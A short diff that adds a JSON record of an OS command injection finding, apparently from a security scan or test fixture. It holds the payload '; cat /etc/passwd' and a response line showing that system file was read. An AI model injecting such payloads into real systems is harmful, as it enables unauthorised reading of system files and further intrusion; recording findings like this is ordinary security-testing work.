@@ -1,0 +1,8 @@
+{
+    "os_command_injection_vulnerabilities": [
+        {
+            "payload": "; cat /etc/passwd",
+            "response": "root:x:0:0:root:/root:/bin/bash"
+        }
+    ]
+}
